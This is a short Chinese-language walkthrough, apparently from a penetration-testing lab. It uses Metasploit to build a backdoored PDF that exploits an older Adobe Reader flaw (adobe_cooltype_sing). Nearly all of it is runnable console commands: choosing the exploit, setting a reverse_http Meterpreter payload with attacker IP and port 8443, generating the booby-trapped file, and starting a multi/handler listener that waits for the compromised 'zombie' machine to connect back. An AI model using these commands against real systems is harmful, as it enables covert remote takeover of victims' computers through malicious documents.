

思路：

```
1.客户机安装（靶机）有漏洞版本的adobe阅读器
2.攻击机kali生成带后门的pdf文件
3.客户机打开该pdf文件，中招
```

渗透代码：

```sh
#metasploit，msfconsole控制台
#1 调用渗透代码
use exploit/windows/fileformat/adobe_cooltype_sing/
#2 设置攻击载荷
set payload windows/meterpreter/reverse_http	#http会话
#3 设置攻击机（本机）ip
set LHOST x.x.x.x
#4 设置本机端口
set LPORT 8443
#5 设置带有后门的pdf文件
set FILENAME PINGINGLAB.pdf
#6 执行渗透
exploit
#此时会在用户目录生成INGLAB.pdf文件，将文件拷贝到客户机

#7 监听肉鸡会话
use exploit/multi/handler
set payload windows/meterpreter/reverse_http
set LHOST x.x.x.x
set LPORT 8443	#设置监听端口
#8 执行
exploit

#9 若肉鸡上线，即被控制

#使用问号查看meterpreter可用命令
?
```

